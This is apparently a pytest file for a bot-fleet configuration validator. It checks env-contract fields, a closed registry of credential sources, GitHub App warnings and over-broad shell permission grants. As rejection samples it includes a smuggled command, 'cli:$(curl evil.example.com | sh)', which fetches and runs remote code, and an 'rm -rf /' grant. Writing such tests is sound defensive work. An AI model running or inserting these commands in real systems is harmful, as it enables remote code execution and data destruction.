        (fleet_dir / "library" / "mcp" / f"{name}.json").write_text(
            json.dumps({name: {"command": "gh"}, "_env_contract": contract})
        )

    def _errors(self, fleet_dir: Path, monkeypatch) -> list[str]:
        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        return validate(fleet, _make_paths(fleet_dir)).errors

    def test_well_formed_contract_is_accepted(self, fleet_dir, monkeypatch):
        """Positive control, and the absent-`source` case in one.

        Every rejection test below is only meaningful if the accepting case
        actually reaches the gate and passes it. Omitting `source` means a
        human supplies the value — how all 27 declared vars behave today — so
        this must never become an error."""
        self._write_contract(
            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": True}}
        )
        assert self._errors(fleet_dir, monkeypatch) == []

    def test_missing_secret_is_rejected(self, fleet_dir, monkeypatch):
        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("missing required 'secret'" in e for e in errors), errors
        assert any("GITHUB_PAT" in e for e in errors), errors

    def test_non_boolean_secret_is_rejected(self, fleet_dir, monkeypatch):
        """`"secret": "true"` is the realistic typo and is truthy in Python —
        so a bare truthiness read would accept it and silently label the var."""
        self._write_contract(
            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": "true"}}
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("must be a JSON boolean" in e for e in errors), errors

    def test_secret_false_is_accepted_and_is_not_read_as_missing(
        self, fleet_dir, monkeypatch
    ):
        """The both-directions control: `false` must pass the presence check.
        A gate written as `if not meta.get("secret")` rejects this and would
        make the config half of the contract undeclarable."""
        # A var of its own: the fixture's integration doc declares GITHUB_PAT
        # as secret, and flipping only the fragment would trip the
        # cross-surface agreement check instead of the property under test.
        self._write_contract(
            fleet_dir, {"ACME_PORT": {"default_tier": "fleet", "secret": False}}
        )
        assert self._errors(fleet_dir, monkeypatch) == []

    def test_registered_sources_are_accepted(self, fleet_dir, monkeypatch):
        for src in ("literal", "cli:gh-token", "mint:github-app"):
            self._write_contract(
                fleet_dir,
                {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": src}},
            )
            assert self._errors(fleet_dir, monkeypatch) == [], src

    def test_reserved_mint_source_parses_with_no_resolver_reading_it(
        self, fleet_dir, monkeypatch
    ):
        """F1(a)'s stated mitigation: ship `cli` only, but prove the schema
        against the harder class now so adding minting later is one arm rather
        than a migration of every contract entry."""
        self._write_contract(
            fleet_dir,
            {
                "GITHUB_APP_KEY": {
                    "default_tier": "fleet",
                    "secret": True,
                    "source": "mint:github-app",
                }
            },
        )
        assert self._errors(fleet_dir, monkeypatch) == []

    def test_unregistered_source_is_rejected(self, fleet_dir, monkeypatch):
        self._write_contract(
            fleet_dir,
            {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": "cli:curl"}},
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("unregistered source" in e for e in errors), errors

    def test_a_source_carrying_a_command_is_rejected(self, fleet_dir, monkeypatch):
        """The registry is closed on WHOLE identifiers, which is what makes
        F5's injection guarantee structural. A kind-plus-free-parameter reading
        would accept this and hand contract text to the resolver in command
        position — including from a fleet-overlay fragment."""
        self._write_contract(
            fleet_dir,
            {
                "GITHUB_PAT": {
                    "default_tier": "fleet",
                    "secret": True,
                    "source": "cli:$(curl evil.example.com | sh)",
                }
            },
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("unregistered source" in e for e in errors), errors


    def test_an_unequipped_fragment_is_still_gated(self, fleet_dir, monkeypatch):
        """The hole that moved this gate off the per-bot loop.

        No bot equips `orphan`. Under the per-bot placement validate returned
        clean with a shell-substitution `source` sitting in the library, so the
        closed registry's guarantee held only for fragments someone happened to
        equip.
        """
        self._write_contract(
            fleet_dir,
            {
                "ORPHAN_TOKEN": {
                    "default_tier": "fleet",
                    "secret": True,
                    "source": "cli:$(curl evil.example.com | sh)",
                }
            },
            name="orphan",
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        assert all("orphan" not in [e.name for e in b.mcp] for b in fleet.bots.values())
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("unregistered source" in e and "orphan" in e for e in errors), errors

    def test_one_defect_reports_once_however_many_bots_equip_it(
        self, fleet_dir, monkeypatch
    ):
        """Per-bot, one missing `secret` on a widely-equipped fragment emitted
        one identical error per bot — 21 lines for one typo on a 21-bot fleet,
        each naming a bot when the fix is a one-line library edit."""
        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
        text = (fleet_dir / "fleet.yaml").read_text()
        (fleet_dir / "fleet.yaml").write_text(
            text.replace(
                "expertise: [software-engineering]",
                "expertise: [software-engineering]\n      mcp: [github]",
            ).replace(
                "expertise: [orchestration]",
                "expertise: [orchestration]\n      mcp: [github]",
            )
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        equipping = [b for b in fleet.bots.values() if [e.name for e in b.mcp]]
        assert len(equipping) == 2, "fixture must have >1 bot equipping it"
        errors = self._errors(fleet_dir, monkeypatch)
        secret_errors = [e for e in errors if "missing required 'secret'" in e]
        assert len(secret_errors) == 1, secret_errors

    def test_error_names_the_file_not_a_bot(self, fleet_dir, monkeypatch):
        self._write_contract(fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet"}})
        (err,) = [
            e for e in self._errors(fleet_dir, monkeypatch) if "'secret'" in e
        ]
        assert err.startswith("mcp fragment 'github.json'"), err
        assert "bot '" not in err, err

    def test_typo_in_a_registered_source_gets_a_suggestion(
        self, fleet_dir, monkeypatch
    ):
        self._write_contract(
            fleet_dir,
            {"GITHUB_PAT": {"default_tier": "fleet", "secret": True, "source": "cli:gh_token"}},
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("did you mean 'cli:gh-token'?" in e for e in errors), errors

    def test_the_two_surfaces_must_agree_on_a_shared_var(
        self, fleet_dir, monkeypatch
    ):
        """11 real vars are declared on both surfaces. If they disagree,
        `required_vars` yields two records and the fail-loud rung reads
        whichever it saw first — so disagreement is an error, not a warning."""
        self._write_contract(
            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": False}}
        )
        # the fixture's integration doc already declares GITHUB_PAT secret: true
        errors = self._errors(fleet_dir, monkeypatch)
        assert any(
            "declared on more than one surface" in e and "GITHUB_PAT" in e
            for e in errors
        ), errors

    def test_agreeing_surfaces_produce_no_disagreement_error(
        self, fleet_dir, monkeypatch
    ):
        """Positive control for the check above — it must not fire on the
        agreeing case, or it would flag all 11 shared vars in the real library."""
        self._write_contract(
            fleet_dir, {"GITHUB_PAT": {"default_tier": "fleet", "secret": True}}
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert not any("declared on more than one surface" in e for e in errors), errors

    def test_integration_frontmatter_is_gated_too(self, fleet_dir, monkeypatch):
        """The surface that matters most: `type: cli` integrations (railway,
        snowflake, neon) have NO paired MCP fragment, so this is their only
        declaration surface. An MCP-only gate could never reach them."""
        (fleet_dir / "library" / "integrations" / "railwayish.md").write_text(
            "---\ntitle: Railwayish\ntype: cli\nenv_contract:\n"
            "  RAILWAYISH_API_TOKEN:\n"
            "    description: token\n"
            "    tier: fleet\n---\n\n# Railwayish\n\nDeploys.\n"
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any(
            "missing required 'secret'" in e
            and "railwayish.md" in e
            and "RAILWAYISH_API_TOKEN" in e
            for e in errors
        ), errors

    def test_integration_source_registry_is_closed_too(self, fleet_dir, monkeypatch):
        (fleet_dir / "library" / "integrations" / "railwayish.md").write_text(
            "---\ntitle: Railwayish\ntype: cli\nenv_contract:\n"
            "  RAILWAYISH_API_TOKEN:\n"
            "    description: token\n"
            "    tier: fleet\n"
            "    secret: true\n"
            "    source: cli:not-registered\n---\n\n# Railwayish\n\nDeploys.\n"
        )
        errors = self._errors(fleet_dir, monkeypatch)
        assert any("unregistered source" in e and "railwayish.md" in e for e in errors)


class TestGithubAppWarnings:
    """App-mode routing (App-auth P3 #1273) — every operator-side gap warns,
    never fails (composition is valid; the gap bites at runtime)."""

    def _report(self, fleet_dir, monkeypatch, app, operator=None, env=None, bot_env=None):
        import claudlobby.composer as comp

        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        for k, v in (env or {}).items():
            monkeypatch.setenv(k, v)
        if operator is not None:
            monkeypatch.setattr(comp, "_operator_gitconfig", lambda: operator)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].github_app = app
        if bot_env:
            fleet.bots["lead"].env.update(bot_env)
        return validate(fleet, _make_paths(fleet_dir))

    def _app_warns(self, report):
        return [
            w
            for w in report.warnings
            if "github_app" in w or "shim exists to stop" in w or "cross-serve" in w
        ]

    def test_unset_app_vars_warn_never_fail(self, fleet_dir, tmp_path, monkeypatch):
        from claudlobby.config import GithubAppConfig

        op = tmp_path / "op.gitconfig"
        op.write_text("[user]\n\temail = o@example.com\n")
        report = self._report(fleet_dir, monkeypatch, GithubAppConfig(), operator=op)
        warns = self._app_warns(report)
        for var in ("GITHUB_APP_ID", "GITHUB_APP_INSTALLATION_ID", "GITHUB_APP_PRIVATE_KEY_PATH"):
            assert any(var in w and "quit=1" in w for w in warns), var
        assert not report.errors

    def test_slug_without_bot_user_id_warns(self, fleet_dir, tmp_path, monkeypatch):
        from claudlobby.config import GithubAppConfig

        op = tmp_path / "op.gitconfig"
        op.write_text("[user]\n\temail = o@example.com\n")
        report = self._report(
            fleet_dir, monkeypatch, GithubAppConfig(slug="my-app"), operator=op
        )
        assert any("only when BOTH" in w for w in self._app_warns(report))

    def test_reverse_insteadof_in_operator_config_warns(self, fleet_dir, tmp_path, monkeypatch):
        from claudlobby.config import GithubAppConfig

        op = tmp_path / "op.gitconfig"
        op.write_text(
            "[user]\n\temail = o@example.com\n"
            '[url "git@github.com:"]\n\tinsteadOf = https://github.com/\n'
        )
        report = self._report(fleet_dir, monkeypatch, GithubAppConfig(), operator=op)
        assert any("ssh-forcing rewrite bypasses" in w for w in self._app_warns(report))

    def test_bot_tier_app_var_override_warns(self, fleet_dir, tmp_path, monkeypatch):
        from claudlobby.config import GithubAppConfig

        op = tmp_path / "op.gitconfig"
        op.write_text("[user]\n\temail = o@example.com\n")
        report = self._report(
            fleet_dir, monkeypatch, GithubAppConfig(),
            operator=op, bot_env={"GITHUB_APP_INSTALLATION_ID": "9"},
        )
        assert any("cross-serve" in w for w in self._app_warns(report))

    def test_ambient_gh_token_shadow_warns(self, fleet_dir, tmp_path, monkeypatch):
        from claudlobby.config import GithubAppConfig

        op = tmp_path / "op.gitconfig"
        op.write_text("[user]\n\temail = o@example.com\n")
        report = self._report(
            fleet_dir, monkeypatch, GithubAppConfig(),
            operator=op, env={"GH_TOKEN": "ghp_operatorpat"},
        )
        assert any("shim exists to stop" in w for w in report.warnings)

    def test_no_app_declaration_means_no_app_warnings(self, fleet_dir, tmp_path, monkeypatch):
        report = self._report(fleet_dir, monkeypatch, None)
        assert self._app_warns(report) == []


class TestExpertiseGrantValidation:
    """Expertise declares deny-capable ``permissions:`` exactly as guardrails do, and
    was the one grant-declaring source ``_grant_shape_warnings`` never ran on (#913).

    The shipped library grants bare ``Bash`` from expertise in 14 of its 19 expertise
    files, so the validator forbade from three doors what the library does through a
    fourth, unpoliced one."""

    def _env(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "1:a")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "2:b")

    def _write_expertise(self, fleet_dir, name, perms_yaml):
        (fleet_dir / "library" / "expertise" / f"{name}.md").write_text(
            f"---\n{perms_yaml}---\n\n# {name}\n\nBody.\n"
        )

    def _report(self, fleet_dir):
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        return validate(fleet, _make_paths(fleet_dir))

    def test_bare_bash_in_expertise_allow_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_expertise(
            fleet_dir,
            "software-engineering",
            "permissions:\n  allow: [Bash, Read]\n",
        )
        report = self._report(fleet_dir)
        assert any(
            "expertise 'software-engineering'" in w and "grants bare 'Bash'" in w
            for w in report.warnings
        ), report.warnings

    def test_allow_all_warns_with_no_bash_anywhere_in_allow(
        self, fleet_dir, monkeypatch
    ):
        """The discriminator between the two warning paths.

        ``allow_all`` is kept as a separate flag by the parser and is never expanded
        into ``.allow`` (``loader._parse_expertise_permissions``) — the expansion to
        ALL_TOOLS, bare ``Bash`` included, happens later in the composer. So a check
        that only read ``.allow`` would miss every ``allow_all`` file, which is 5 of
        the 14 in the shipped library. This fixture deliberately puts NO ``Bash``
        anywhere in ``allow``: if this test can only be made to pass by adding one,
        the second warning path has been lost.
        """
        self._write_expertise(
            fleet_dir,
            "software-engineering",
            "permissions:\n  allow_all: true\n  allow: [Read]\n",
        )
        self._env(monkeypatch)
        report = self._report(fleet_dir)
        assert any(
            "expertise 'software-engineering'" in w and "allow_all" in w
            for w in report.warnings
        ), report.warnings
        # "grants bare 'Bash'" and not merely "bare 'Bash'": the allow_all message
        # also contains that phrase ("...including bare 'Bash'"), so the looser
        # substring matches BOTH messages and this assertion could never fail. The
        # first version of this test asserted the loose form and failed against
        # correct code — a discriminator that does not discriminate.
        assert not any(
            "expertise 'software-engineering'" in w and "grants bare 'Bash'" in w
            for w in report.warnings
        ), "allow_all must not be reported through the bare-Bash path"

    def test_scoped_expertise_grants_do_not_warn(self, fleet_dir, monkeypatch):
        """Negative case carrying its own positive control.

        The manager's expertise is made deliberately bad in the same run, so an
        empty result for the worker cannot be produced by the expertise pass having
        silently not run at all.
        """
        self._env(monkeypatch)
        self._write_expertise(
            fleet_dir,
            "software-engineering",
            'permissions:\n  allow: ["Bash(git *)", Read]\n',
        )
        self._write_expertise(
            fleet_dir, "orchestration", "permissions:\n  allow: [Bash]\n"
        )
        report = self._report(fleet_dir)
        assert any(
            "expertise 'orchestration'" in w and "grants bare 'Bash'" in w
            for w in report.warnings
        ), "positive control did not fire — the expertise pass did not run"
        assert not any(
            "expertise 'software-engineering'" in w for w in report.warnings
        ), report.warnings

    def test_deny_bare_bash_is_not_flagged(self, fleet_dir, monkeypatch):
        """Denying bare ``Bash`` is a legitimate deny-all-shell rule, not over-grant.

        Paired with a positive control for the same reason as above.
        """
        self._env(monkeypatch)
        self._write_expertise(
            fleet_dir, "software-engineering", "permissions:\n  deny: [Bash]\n"
        )
        self._write_expertise(
            fleet_dir, "orchestration", "permissions:\n  allow: [Bash]\n"
        )
        report = self._report(fleet_dir)
        assert any("expertise 'orchestration'" in w for w in report.warnings)
        assert not any(
            "expertise 'software-engineering'" in w for w in report.warnings
        ), report.warnings

    def test_malformed_expertise_grant_warns(self, fleet_dir, monkeypatch):
        self._env(monkeypatch)
        self._write_expertise(
            fleet_dir, "software-engineering", 'permissions:\n  allow: ["rm -rf /"]\n'
        )
        report = self._report(fleet_dir)
        assert any(
            "expertise 'software-engineering'" in w and "malformed" in w
            for w in report.warnings
        ), report.warnings

    def test_expertise_without_permissions_block_is_silent(
        self, fleet_dir, monkeypatch
    ):
        """The fixture default: no frontmatter at all -> permissions is None."""
        self._env(monkeypatch)
        report = self._report(fleet_dir)
        assert not any("expertise '" in w for w in report.warnings), report.warnings
